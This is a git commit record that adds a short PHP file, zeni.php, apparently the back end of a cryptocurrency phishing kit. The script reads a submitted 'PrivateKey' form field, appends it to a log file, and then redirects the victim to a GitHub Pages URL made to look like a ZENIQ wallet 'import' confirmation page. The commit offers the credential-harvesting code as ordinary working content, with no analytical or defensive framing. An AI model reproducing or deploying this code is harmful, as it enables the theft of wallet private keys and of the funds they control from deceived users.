8832c48945705056ecfe2e31f67700284a80a1d3
Zeniq-real-Coin <119984164+Zeniq-real-Coin@users.noreply.github.com>
2022-12-07 19:07:01 +0700

    Add files via upload

---
+++ zeni.php
@@ -0,0 +1,23 @@
+
+<?php
+$file = "LAZADA12122023";
+$ip   = getenv("REMOTE_ADDR");
+$PrivateKey   = $_POST['PrivateKey'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "\n");
+fwrite($handle, "ZENIQQ :: ");
+fwrite($handle, "$PrivateKey");
+fwrite($handle, "\n");
+fwrite($handle, "S3MP4K-B4NK.COM");
+fwrite($handle, "\n");
+fclose($handle);
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"https://Zeniq-real-Coin.github.io/Dubay/now/zeniqwallet/import.html#confirm-page-container-navigation\";
+// -->
+</script>";
+?>
+
+
